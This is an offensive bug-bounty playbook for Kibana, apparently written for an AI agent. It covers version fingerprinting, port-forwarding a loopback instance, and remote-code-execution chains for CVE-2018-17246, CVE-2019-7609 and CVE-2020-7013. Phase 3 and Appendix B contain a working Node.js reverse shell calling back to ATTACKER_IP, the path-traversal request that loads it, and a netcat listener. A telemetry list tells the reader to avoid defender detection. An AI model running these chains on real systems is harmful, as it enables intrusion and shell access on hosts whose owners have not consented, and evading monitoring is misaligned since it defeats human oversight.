---
technology: "Kibana"
kind: bug-bounty-methodology
audience: ai-agent
version: 1.0
source: "field-grounded THIN (1 evidence file; see internal coverage ledger) + upstream-verified: NVD CVE-2018-17246 + Elastic blog, NVD CVE-2019-7609 + mpgn PoC + Rapid7 module, CVE-2020-7013 via Elastic 6.8.9/7.7.0 advisory + Red Hat, 2026-11-12"
provenance: "corpus-grounded: 2 contributing writeups (internal coverage ledger, gate documented in header); upstream CVEs verified against primary sources during enrichment; basis of this page summarized from the unit ledger"
---

Companion page: [[kibana|Kibana overview]] — what the technology is and where you will meet it. Tool reference notes live in the separate tools vault; Appendix A names the relevant tools in prose.

# Kibana Bug Bounty Methodology

**Scope:** Kibana on 5601/tcp (exposed or loopback-behind-a-foothold), any version; saved-object and expression-evaluation abuse riding [[elasticsearch]] access. **Out of scope:** Elasticsearch's own REST surface ([[elasticsearch]]), Logstash pipelines, OpenSearch Dashboards (fork — same lineage, own advisory history; treat claims as unverified).

**Authorization:** presume written permission. Code execution lands on the ES host as a service user — confirm that is in scope before Phase 4. DESTRUCTIVE flags mark code-execution steps.

**Evidence reality note:** one chain carries the whole weight here: loopback discovery → port-forward → version read → CVE-2018-17246 chain. The rest is upstream-verified advisory history.

## Decision tree (one screen)

1. 5601 reachable (direct or via forward) → `GET /api/status` → version decides the fork.
2. Version `>=6.4.3 and <6.6.1` (or <5.6.15) → Phase 4 Timelion.
3. Version `<6.4.3` / `<5.6.13` → Phase 3 Console LFI.
4. Version `<6.8.9` / `<7.7.0` + any write to ES `.kibana` index → Phase 5 TSVB.
5. Modern (7.7+) with real auth → Phase 6 (post-2020 surface is authenticated-only; hunt creds, not CVEs).

## Phase 1 — Fingerprinting (landing to version)

```bash
nmap -p5601,9200 -sV 198.51.100.10        # both halves of the stack at once
curl -s http://198.51.100.10:5601/api/status | jq '.version.number,.state'
```

Read: the landing page (`/app/kibana`) identifies the app; `/api/status` is the version oracle (observed: `6.4.2` read from it, browser-only). No login form on the landing page = X-Pack security off = every "authenticated attacker" gate in the CVE list is already satisfied. 9201/9200 context: see [[elasticsearch]].

## Phase 2 — Loopback pattern (the observed route)

```bash
# on the foothold: find it
ss -4ltn                        # observed — 127.0.0.1:5601 listening
# bring it to you
ssh -L 5601:127.0.0.1:5601 user@198.51.100.10 -N
```

Kibana-on-loopback is the deployment default for the same hosts that run ES loopback. The chain is always: enumerate local listeners → forward → treat as local web target. Chisel/socat substitute when SSH egress is filtered.

## Phase 3 — Console LFI → RCE (CVE-2018-17246)

Kibana <6.4.3 and <5.6.13. The Console plugin's server endpoint includes a path you control; Node loads the file. Observed chain (verbatim shape):

```bash
# 1) plant a JS payload anywhere the Kibana host can read (target-local write, shared mount, or a URL it can fetch)
cat > /tmp/shell.js <<'EOF'
(function(){
  var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []);
  var c = new net.Socket();
  c.connect(9001, "ATTACKER_IP", function(){ c.pipe(sh.stdin); sh.stdout.pipe(c); sh.stderr.pipe(c); });
})();
EOF
# 2) include it through the Console API
curl -v --path-as-is \
  'http://127.0.0.1:5601/api/console/api_server?apis=../../../../../../../../tmp/shell.js'
# 3) catch the callback
nc -lvnp 9001
```

DESTRUCTIVE. The payload runs as the kibana/elasticsearch service user. Prereqs: a file path Kibana can include AND you can populate — the observed chain wrote /tmp on the same host; without a local write, find any world-readable JS you can influence (uploads, caches) before declaring the bug unexploitable.

## Phase 4 — Timelion prototype pollution → RCE (CVE-2019-7609)

Kibana <5.6.15 and <6.6.1. The Timelion visualizer evaluates expressions server-side; a crafted expression pollutes `Object.prototype` and chains to command execution. Requirements: access to the Timelion app (no real auth pre-X-Pack). Public PoCs (mpgn's repo; Metasploit module `kibana_timelion_prototype_pollution_rce`) take a URL and a listener. Payload shape: a Timelion expression whose `.props()` argument performs the prototype assignment, then triggering evaluation — use the published PoC rather than hand-rolling; expression quoting is finicky. DESTRUCTIVE — same service-user shell.

## Phase 5 — Saved-object / TSVB write → RCE (CVE-2020-7013)

Kibana <6.8.9 and <7.7.0. Prototype pollution in TSVB; the gate is **write access to the Kibana index** — i.e., this is the ES-pivot CVE: with credentials or an open 9200 ([[elasticsearch]] Phase 2-4), a crafted document written to the `.kibana` space executes code when Kibana evaluates it. Cross-reference the ES write primitive first; if you have it and the banner is in range, this is the shortest path to the ES host shell.

## Phase 6 — Modern surface (7.7+)

- Real authentication (ES realms) gates everything: credential hunt over CVE hunt — [[elasticsearch]] Phase 2 sources transfer (`ELASTICURI`-style env, app configs, Kibana service accounts).
- Check the space/feature privileges of the account you hold (read-only spaces, Dashboard-only mode) — saved-object *editing* is the prize; viewers mostly can't reach the evaluation endpoints anymore.
- Unpatched 7.x-8.x minors still ship real CVEs (e.g., CVE-2020-7013 successors in TSVB/annalyzer plugins) — match the exact banner against Elastic's advisory index before writing it off; do not generalize from memory.

## Phase 7 — Defense and validation notes

- **Finding shape:** `/api/status` screenshot + version + PoC callback (whoami output as the kibana user). For the ES-pivot (Phase 5), show the written saved object AND the callback — the write source is the report.
- **Defender telemetry (note and avoid):** `/api/console/api_server` with `../` runs, Timelion expression posts with `__proto__` strings, writes to `.kibana-*` indices from non-Kibana service accounts, node processes spawning `/bin/sh`.
- **Hardening:** patch past 6.4.3/6.6.1/7.7.0 lines; enable X-Pack security (Basic-tier free since 6.8/7.1 — [[elasticsearch]]); bind 5601 to loopback and front it with an authenticating reverse proxy; restrict `.kibana` index writes to the Kibana service account only.

## Appendix A — Tooling (named in prose)

- **nmap** — 5601/9200 service detection; the stack arrives together.
- **curl / jq** — `/api/status` version oracle and all endpoint probing; `--path-as-is` for the LFI.
- **ss / netstat** — loopback listener discovery on the foothold (observed: `ss -4ltn`).
- **ssh -L / chisel / socat** — port-forward the loopback instance.
- **Metasploit** (Timelion module) and **mpgn's CVE-2019-7609 PoC** — published, maintained exploit paths.
- **nc** — reverse-shell listener for both RCE chains.
- References: NVD CVE-2018-17246 (+ Elastic blog, CyberArk research), NVD CVE-2019-7609 (+ mpgn PoC, Rapid7), Elastic 6.8.9/7.7.0 advisory for CVE-2020-7013 (all upstream-verified for this page).

## Appendix B — Quick reference

```bash
# version oracle (the fork)
curl -s http://198.51.100.10:5601/api/status | jq '.version.number'
# loopback pattern (observed)
ssh -L 5601:127.0.0.1:5601 user@198.51.100.10 -N
# Console LFI era (<6.4.3/<5.6.13)
curl --path-as-is 'http://127.0.0.1:5601/api/console/api_server?apis=../../../../../../../../tmp/shell.js'
# Timelion era (<5.6.15/<6.6.1): PoC + listener
nc -lvnp 9001   # then run the published CVE-2019-7609 exploit against :5601
```
